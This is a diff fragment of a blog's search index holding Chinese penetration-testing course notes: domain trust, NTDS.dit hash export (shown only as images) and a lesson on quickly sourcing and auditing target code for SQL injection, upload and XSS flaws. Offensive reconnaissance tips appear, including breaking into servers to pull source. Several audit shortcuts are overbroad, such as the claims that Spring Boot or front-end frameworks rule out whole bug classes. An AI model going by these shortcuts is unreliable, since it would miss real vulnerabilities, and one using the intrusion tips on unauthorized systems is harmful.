+<p><img src="https://cheihei.oss-cn-zhangjiakou.aliyuncs.com/image-20230529131452269.png" alt="image-20230529131452269"></p>
+<p><img src="https://cheihei.oss-cn-zhangjiakou.aliyuncs.com/image-20230529131513521.png" alt="image-20230529131513521"></p>
+<p>A与B有信任关系，B与C有信任关系，那么A与C也具有信任关系</p>
+<p><img src="https://cheihei.oss-cn-zhangjiakou.aliyuncs.com/image-20230529131634462.png" alt="image-20230529131634462"></p>
+<h2 id="五、NTDS-dit-导出hash"><a href="#五、NTDS-dit-导出hash" class="headerlink" title="五、NTDS dit 导出hash"></a>五、NTDS dit 导出hash</h2><p><img src="https://cheihei.oss-cn-zhangjiakou.aliyuncs.com/image-20230529131757647.png" alt="image-20230529131757647"></p>
+<p><img src="https://cheihei.oss-cn-zhangjiakou.aliyuncs.com/image-20230529131912336.png" alt="image-20230529131912336"></p>
+<p><img src="https://cheihei.oss-cn-zhangjiakou.aliyuncs.com/image-20230529131926259.png" alt="image-20230529131926259"></p>
+<p>py环境配置</p>
+<p><img src="https://cheihei.oss-cn-zhangjiakou.aliyuncs.com/image-20230529132034338.png" alt="image-20230529132034338"></p>
+<p><img src="https://cheihei.oss-cn-zhangjiakou.aliyuncs.com/image-20230529132047690.png" alt="image-20230529132047690"></p>
+<p>三种常见方法脚本：</p>
+<p><img src="https://cheihei.oss-cn-zhangjiakou.aliyuncs.com/image-20230529132119348.png" alt="image-20230529132119348"></p>
+<h2 id="六、常见内网拓扑分析"><a href="#六、常见内网拓扑分析" class="headerlink" title="六、常见内网拓扑分析"></a>六、常见内网拓扑分析</h2><p><img src="https://cheihei.oss-cn-zhangjiakou.aliyuncs.com/image-20230529132219798.png" alt="image-20230529132219798"></p>
+<p><img src="https://cheihei.oss-cn-zhangjiakou.aliyuncs.com/image-20230529132237909.png" alt="image-20230529132237909"></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>第四课-实战中的快速审计</title>
+    <url>/2023/05/22/%E7%AC%AC%E5%9B%9B%E8%AF%BE-%E5%AE%9E%E6%88%98%E4%B8%AD%E7%9A%84%E5%BF%AB%E9%80%9F%E5%AE%A1%E8%AE%A1/</url>
+    <content><![CDATA[<h1 id="第四课-实战中的快速审计"><a href="#第四课-实战中的快速审计" class="headerlink" title="第四课-实战中的快速审计"></a>第四课-实战中的快速审计</h1><h2 id="高效获取源码的方式"><a href="#高效获取源码的方式" class="headerlink" title="高效获取源码的方式"></a><strong>高效获取源码的方式</strong></h2><p><strong>1、fofa关键字搜索提取指纹特征</strong></p>
+<p>查看前端代码，是否为cms，搜索引擎搜tilte关键字、url目录结构、页面js文件和icon图标，结果多，为cms，然后从github或gitee上找该cms源码</p>
+<p><strong>2、github和gitee搜索</strong></p>
+<p><strong>3、源码网站搜索</strong></p>
+<p>down.chinaz.com</p>
+<p>zuidaima.com</p>
+<p>bbs.52jscn.com</p>
+<p><strong>4、拖源码</strong></p>
+<p>有授权的情况，通过其他方式打进服务器，拖取源码</p>
+<p><strong>5、官网买</strong></p>
+<p><strong>6、同站点目录扫描</strong></p>
+<p>找相同的cms网站，扫描目录下的备份文件</p>
+<h2 id="快速审计"><a href="#快速审计" class="headerlink" title="快速审计"></a>快速审计</h2><p><strong>源码扫描工具</strong></p>
+<p>DMSCA-企业级静态源代码扫描分析服务平台</p>
+<p>VeraCode静态源代码扫描分析服务平台</p>
+<p>FortifyScan</p>
+<p><strong>手工代码审计</strong></p>
+<p>1、pom评估与lib评估（pom.xml）</p>
+<p>内部是引用的外部组件，百度搜索历史漏洞，有一些组件有自己的端口号可以考虑作为突破口</p>
+<p>2、sql注入快速评估</p>
+<p>了解持久层选择的框架如mybatis，hibernate，mybatisplus</p>
+<p>mybatisplus不存在sql语句</p>
+<p>看组件调用时，遇到mybatisplus证明没有sql注入，放弃sql注入入手</p>
+<p>mybatis</p>
+<p>(1)、xml文件sql</p>
+<p>将SQL语句全部放在xml下</p>
+<p>(2)、源码方式</p>
+<p>在源码中找sql语句</p>
+<p>#{}预编译方式解决sql注入，不存在SQL注入</p>
+<p>${}存在sql注入</p>
+<p>(3)、判断脆弱点是否用户可控</p>
+<p>3、文件上传漏洞</p>
+<p>全局寻找upload关键字</p>
+<p>遇到springboot就不用审计文件上传漏洞</p>
+<p>4、xss漏洞</p>
+<p>vue，react，angular预编译技术，不存在xss</p>
+<p>然后查看后端是否有xss拦截，XSSFilter</p>
 ]]></content>
   </entry>
   <entry>
